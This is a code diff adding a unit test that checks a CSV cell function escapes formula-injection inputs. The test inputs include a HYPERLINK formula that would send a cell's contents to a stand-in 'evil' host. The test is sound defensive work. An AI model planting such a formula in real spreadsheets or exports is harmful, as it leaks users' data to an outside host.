@@ -11,6 +11,18 @@ describe("domain/csv", () => {
     expect(celulaCSV('diz "oi", tchau')).toBe('"diz ""oi"", tchau"');
     expect(celulaCSV("a\nb")).toBe('"a\nb"');
   });
+  it("neutraliza fórmula (CSV injection, OWASP): prefixa ' em = + - @ tab CR", () => {
+    expect(celulaCSV("=1+1")).toBe("'=1+1");
+    expect(celulaCSV("+55")).toBe("'+55");
+    expect(celulaCSV("-2")).toBe("'-2");
+    expect(celulaCSV("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(celulaCSV("\tx")).toBe("'\tx");
+    expect(celulaCSV("\rx")).toBe("\"'\rx\"");
+    expect(celulaCSV('=HYPERLINK("https://evil/?"&A2,"ver")')).toBe(
+      '"\'=HYPERLINK(""https://evil/?""&A2,""ver"")"',
+    );
+    expect(celulaCSV("a-b")).toBe("a-b");
+  });
   it("BOM + cabeçalho exato + linha formatada", () => {
     const csv = equipesCSV([
       {
